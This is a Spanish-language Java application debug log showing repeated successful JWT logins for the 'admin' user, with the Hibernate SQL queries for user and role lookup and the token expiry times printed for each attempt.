17:10:24.222 [http-nio-auto-4-exec-6] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:24.223 [http-nio-auto-4-exec-6] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:24.480 [http-nio-auto-4-exec-6] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:24.482 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:24.482 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:24 MST 2025, expiration: Wed Jul 02 18:10:24 MST 2025
17:10:24.484 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:24.485 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:24.485 [http-nio-auto-4-exec-6] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:24.493 [http-nio-auto-4-exec-7] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:24.494 [http-nio-auto-4-exec-7] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:24.758 [http-nio-auto-4-exec-7] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:24.760 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:24.760 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:24 MST 2025, expiration: Wed Jul 02 18:10:24 MST 2025
17:10:24.761 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:24.763 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:24.763 [http-nio-auto-4-exec-7] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:24.770 [http-nio-auto-4-exec-8] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:24.772 [http-nio-auto-4-exec-8] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:25.040 [http-nio-auto-4-exec-8] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:25.042 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:25.043 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:25 MST 2025, expiration: Wed Jul 02 18:10:25 MST 2025
17:10:25.045 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:25.046 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:25.046 [http-nio-auto-4-exec-8] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:25.054 [http-nio-auto-4-exec-9] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:25.055 [http-nio-auto-4-exec-9] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:25.314 [http-nio-auto-4-exec-9] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:25.316 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:25.317 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:25 MST 2025, expiration: Wed Jul 02 18:10:25 MST 2025
17:10:25.318 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:25.320 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:25.320 [http-nio-auto-4-exec-9] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:25.327 [http-nio-auto-4-exec-10] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:25.329 [http-nio-auto-4-exec-10] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:25.588 [http-nio-auto-4-exec-10] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:25.590 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:25.590 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:25 MST 2025, expiration: Wed Jul 02 18:10:25 MST 2025
17:10:25.592 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:25.593 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:25.594 [http-nio-auto-4-exec-10] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:25.601 [http-nio-auto-4-exec-1] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:25.602 [http-nio-auto-4-exec-1] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:25.862 [http-nio-auto-4-exec-1] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:25.865 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:25.865 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:25 MST 2025, expiration: Wed Jul 02 18:10:25 MST 2025
17:10:25.866 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:25.868 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:25.868 [http-nio-auto-4-exec-1] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:25.875 [http-nio-auto-4-exec-2] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:25.879 [http-nio-auto-4-exec-2] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:26.145 [http-nio-auto-4-exec-2] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:26.148 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:26.148 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:26 MST 2025, expiration: Wed Jul 02 18:10:26 MST 2025
17:10:26.149 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:26.151 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:26.151 [http-nio-auto-4-exec-2] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:26.159 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:26.160 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:26.418 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:26.420 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:26.420 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:26 MST 2025, expiration: Wed Jul 02 18:10:26 MST 2025
17:10:26.422 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:26.423 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:26.424 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:26.430 [http-nio-auto-4-exec-4] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:26.431 [http-nio-auto-4-exec-4] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:26.692 [http-nio-auto-4-exec-4] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:26.695 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:26.695 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:26 MST 2025, expiration: Wed Jul 02 18:10:26 MST 2025
17:10:26.697 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:26.698 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:26.698 [http-nio-auto-4-exec-4] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:26.705 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:26.706 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:26.967 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:26.969 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:26.969 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:26 MST 2025, expiration: Wed Jul 02 18:10:26 MST 2025
17:10:26.971 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:26.972 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:26.972 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:26.980 [http-nio-auto-4-exec-6] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:26.981 [http-nio-auto-4-exec-6] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:27.246 [http-nio-auto-4-exec-6] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:27.248 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:27.248 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:27 MST 2025, expiration: Wed Jul 02 18:10:27 MST 2025
17:10:27.249 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:27.251 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:27.251 [http-nio-auto-4-exec-6] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:27.258 [http-nio-auto-4-exec-7] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:27.260 [http-nio-auto-4-exec-7] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:27.523 [http-nio-auto-4-exec-7] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:27.526 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:27.526 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:27 MST 2025, expiration: Wed Jul 02 18:10:27 MST 2025
17:10:27.528 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:27.529 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:27.529 [http-nio-auto-4-exec-7] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:27.536 [http-nio-auto-4-exec-8] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:27.537 [http-nio-auto-4-exec-8] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:27.801 [http-nio-auto-4-exec-8] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:27.803 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:27.803 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:27 MST 2025, expiration: Wed Jul 02 18:10:27 MST 2025
17:10:27.804 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:27.806 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:27.806 [http-nio-auto-4-exec-8] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:27.813 [http-nio-auto-4-exec-9] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:27.814 [http-nio-auto-4-exec-9] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:28.074 [http-nio-auto-4-exec-9] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:28.078 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:28.078 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:28 MST 2025, expiration: Wed Jul 02 18:10:28 MST 2025
17:10:28.080 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:28.081 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:28.081 [http-nio-auto-4-exec-9] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:28.088 [http-nio-auto-4-exec-10] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:28.089 [http-nio-auto-4-exec-10] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:28.348 [http-nio-auto-4-exec-10] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:28.350 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:28.350 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:28 MST 2025, expiration: Wed Jul 02 18:10:28 MST 2025
17:10:28.352 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:28.354 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:28.354 [http-nio-auto-4-exec-10] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:28.361 [http-nio-auto-4-exec-1] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:28.363 [http-nio-auto-4-exec-1] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
